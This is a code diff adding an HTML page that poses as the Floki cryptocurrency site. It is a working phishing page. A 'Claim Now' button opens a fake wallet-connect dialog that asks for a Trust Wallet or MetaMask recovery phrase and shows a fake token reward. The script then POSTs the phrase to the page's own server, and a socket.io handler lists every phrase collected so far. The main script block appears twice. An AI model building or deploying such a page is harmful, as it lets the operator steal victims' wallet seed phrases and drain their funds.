@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responsive Website</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Login/Signup Modal -->
+   
+
+    <!-- Existing HTML content here -->
+    <nav>
+        <div class="nav-container">
+            <div class="logo">
+                <img src="misc/floki-inu-floki-logo.png" alt="Logo">
+            </div>
+            <input type="checkbox" id="menu-toggle">
+            <label for="menu-toggle" class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </label>
+            <ul class="navbar">
+                <li><a href="https://www.floki.com/#ecosystem">Ecosystem</a></li>
+                <li><a href="https://www.floki.com/#updates">Updates</a></li>
+                <li><a href="https://www.floki.com/#community">Community</a></li>
+                <li><a href="https://www.floki.com/buy">Buy</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="hero-section">
+        <div class="left-align">
+            <h1>The People's Cryptocurrency</h1>
+            <p>Floki is the utility token of Floki ecosystem.</p>
+            <div class="buttons">
+                <button class="btn primary" id="claim-now">Claim Now</button>
+                <button class="btn secondary" onclick="window.location.href='https://www.floki.com/buy'">Buy Floki</button>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <section class="core-values">
+            <h3>Core Values</h3>
+            <h2>Floki's Three Pillars</h2>
+            <div class="values">
+                <div class="value">
+                    <h3>Community</h3>
+                    <p>The Floki Vikings, a global community over 470,000 strong, are on a mission to make Floki the most popular crypto in the world. We are known for epic social media raids and making Floki memes to appeal to the masses. The community is the heart and soul of Floki.</p>
+                </div>
+                <div class="value">
+                    <h3>Utility</h3>
+                    <p>What started as a meme has developed into an industry-leading utility project. Floki's innovative ecosystem offers a 3D NFT Metaverse, DeFi utilities, a crypto education platform, NFTs, a merchandise store, and more. Utility for the FLOKI token is our fundamental focus.</p>
+                </div>
+                <div class="value">
+                    <h3>Charity</h3>
+                    <p>Among other initiatives, Floki has pledged to build a state-of-the-art school first on every continent, then in every underdeveloped nation of the world. Guatemala, Ghana, Laos, and Nigeria are already home to Floki schools. Making real-world change is at the core of Floki's mission.</p>
+                </div>
+            </div>
+        </section>
+        <hr>
+
+        <!-- Video Section -->
+        <section class="video-section">
+            <h3>From meme to utility , Floki has it all.</h3>
+            <video controls>
+                <source src="misc/tv-ad.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </section>
+        <hr>
+
+        <section class="staking">
+            <h3>Staking</h3>
+            <h2>Stake. Earn. Claim Rewards.</h2>
+            <p>Stake your Floki token and earn Floki's sister/reward token, Token.</p>
+            <button class="btn large" onclick="window.location.href='https://staking.floki.com/'">Staking</button>
+            <hr>
+            <div class="statistics">
+                <div class="s">
+                    <h2>$598 M+</h2>
+                    <p>Staked</p>
+                </div>
+                <div class="s">
+                    <h2>460 000+</h2>
+                    <p>Holders</p>
+                </div>
+            </div>
+        </section>
+        <img src="misc/GOquKoWWoAEPecp.jpg" alt="Description of your image"> <!-- Add your image here -->
+    </main>
+    
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-col">
+                <h3>Contact Us</h3>
+                <p>Email: flokisupport@gmail.com</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal for Connect Wallet -->
+    <div id="wallet-modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Connect your wallet</h2>
+            <div class="wallet-options" id="wallet-options">
+                <div class="wallet" id="trust-wallet">
+                    <img src="misc/trustwalletlogo.png" alt="Trust Wallet">
+                    <p>Trust Wallet</p>
+                </div>
+                <div class="wallet" id="meta-mask">
+                    <img src="misc/metamask.jpg" alt="Meta Mask">
+                    <p>Meta Mask</p>
+                </div>
+            </div>
+            <div class="recovery-phrase" id="recovery-phrase" style="display:none;">
+                <label for="recovery-input">Enter your recovery phrase</label>
+                <input type="text" id="recovery-input">
+                <button id="submit-recovery">Submit</button>
+            </div>
+            <p id="message-display" style="display:none;"></p> <!-- Message display area -->
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('claim-btn').addEventListener('click', async () => {
+            const phrase = document.getElementById('recovery-phrase').value;
+            const walletType = document.getElementById('wallet-type').value; // Assume you have a select input for wallet type
+
+            const response = await fetch('/submit-recovery-phrase', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ phrase, walletType })
+            });
+
+            const data = await response.json();
+            if (data.success) {
+                alert(data.message);
+            }
+        });
+    </script>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const claimNowButton = document.getElementById('claim-now');
+            const modal = document.getElementById('wallet-modal');
+            const closeModal = document.querySelector('.modal .close');
+            const walletOptions = document.getElementById('wallet-options');
+            const recoveryPhrase = document.getElementById('recovery-phrase');
+            const trustWallet = document.getElementById('trust-wallet');
+            const metaMask = document.getElementById('meta-mask');
+            const submitRecovery = document.getElementById('submit-recovery');
+            const messageDisplay = document.getElementById('message-display');
+            let selectedWallet = '';
+    
+            claimNowButton.addEventListener('click', function() {
+                modal.style.display = 'block';
+                document.body.style.overflow = 'hidden'; // Prevent background scrolling
+                walletOptions.style.display = 'flex';
+                recoveryPhrase.style.display = 'none';
+                messageDisplay.style.display = 'none'; // Hide message display
+            });
+    
+            closeModal.addEventListener('click', function() {
+                modal.style.display = 'none';
+                document.body.style.overflow = 'auto'; // Restore background scrolling
+            });
+    
+            window.addEventListener('click', function(event) {
+                if (event.target == modal) {
+                    modal.style.display = 'none';
+                    document.body.style.overflow = 'auto'; // Restore background scrolling
+                }
+            });
+    
+            trustWallet.addEventListener('click', function() {
+                walletOptions.style.display = 'none';
+                recoveryPhrase.style.display = 'block';
+                selectedWallet = 'TWT';
+            });
+    
+            metaMask.addEventListener('click', function() {
+                walletOptions.style.display = 'none';
+                recoveryPhrase.style.display = 'block';
+                selectedWallet = 'MM';
+            });
+    
+            submitRecovery.addEventListener('click', function() {
+                const recoveryInput = document.getElementById('recovery-input').value.trim();
+                const wordCount = recoveryInput.split(/\s+/).length;
+    
+                if (recoveryInput === '' || wordCount < 12) {
+                    messageDisplay.textContent = 'Please enter the correct recovery phrase';
+                    messageDisplay.style.color = 'red';
+                    messageDisplay.style.display = 'block';
+                } else {
+                    const randomTokens = Math.floor(Math.random() * (10000 - 1000 + 1)) + 1000;
+                    messageDisplay.textContent = `${randomTokens} floki tokens have been added to your wallet`;
+                    messageDisplay.style.color = 'green';
+                    messageDisplay.style.display = 'block';
+    
+                    fetch('/submit-recovery-phrase', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ phrase: selectedWallet + ':' + recoveryInput })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+    
+                    setTimeout(() => {
+                        modal.style.display = 'none';
+                        document.body.style.overflow = 'auto'; // Restore background scrolling
+                    }, 30000); // Close modal after 3 minutes
+                }
+            });
+    
+        });
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const socket = io();
+    
+            socket.on('recoveryPhrases', (phrases) => {
+                console.clear();
+                console.log('All Recovery Phrases:');
+                phrases.forEach((phrase, index) => {
+                    console.log(`${index + 1}: ${phrase}`);
+                });
+            });
+    
+            const claimNowButton = document.getElementById('claim-now');
+            const modal = document.getElementById('wallet-modal');
+            const closeModal = document.querySelector('.modal .close');
+            const walletOptions = document.getElementById('wallet-options');
+            const recoveryPhrase = document.getElementById('recovery-phrase');
+            const trustWallet = document.getElementById('trust-wallet');
+            const metaMask = document.getElementById('meta-mask');
+            const submitRecovery = document.getElementById('submit-recovery');
+            const messageDisplay = document.getElementById('message-display');
+            let selectedWallet = '';
+    
+            claimNowButton.addEventListener('click', function() {
+                modal.style.display = 'block';
+                document.body.style.overflow = 'hidden'; // Prevent background scrolling
+                walletOptions.style.display = 'flex';
+                recoveryPhrase.style.display = 'none';
+                messageDisplay.style.display = 'none'; // Hide message display
+            });
+    
+            closeModal.addEventListener('click', function() {
+                modal.style.display = 'none';
+                document.body.style.overflow = 'auto'; // Restore background scrolling
+            });
+    
+            window.addEventListener('click', function(event) {
+                if (event.target == modal) {
+                    modal.style.display = 'none';
+                    document.body.style.overflow = 'auto'; // Restore background scrolling
+                }
+            });
+    
+            trustWallet.addEventListener('click', function() {
+                walletOptions.style.display = 'none';
+                recoveryPhrase.style.display = 'block';
+                selectedWallet = 'TWT';
+            });
+    
+            metaMask.addEventListener('click', function() {
+                walletOptions.style.display = 'none';
+                recoveryPhrase.style.display = 'block';
+                selectedWallet = 'MM';
+            });
+    
+            submitRecovery.addEventListener('click', function() {
+                const recoveryInput = document.getElementById('recovery-input').value.trim();
+                const wordCount = recoveryInput.split(/\s+/).length;
+    
+                if (recoveryInput === '' || wordCount < 12) {
+                    messageDisplay.textContent = 'Please enter the correct recovery phrase';
+                    messageDisplay.style.color = 'red';
+                    messageDisplay.style.display = 'block';
+                } else {
+                    const randomTokens = Math.floor(Math.random() * (10000 - 1000 + 1)) + 1000;
+                    messageDisplay.textContent = `${randomTokens} floki tokens have been added to your wallet`;
+                    messageDisplay.style.color = 'green';
+                    messageDisplay.style.display = 'block';
+    
+                    fetch('/submit-recovery-phrase', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ phrase: selectedWallet + ':' + recoveryInput })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+    
+                    setTimeout(() => {
+                        modal.style.display = 'none';
+                        document.body.style.overflow = 'auto'; // Restore background scrolling
+                    }, 30000); // Close modal after 3 minutes
+                }
+            });
+    
+        });
+    </script>
+    
+</body>
+</html>
